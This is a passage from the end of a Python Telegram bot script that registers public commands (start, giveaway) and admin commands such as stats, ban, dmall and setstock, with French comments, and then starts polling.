    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))

    # Commandes publiques
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("giveaway", cmd_giveaway))

    # Commandes admin
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("top", cmd_top))
    app.add_handler(CommandHandler("dmall", cmd_dmall))
    app.add_handler(CommandHandler("setrates", cmd_setrates))
    app.add_handler(CommandHandler("setstock", cmd_setstock))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))

    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
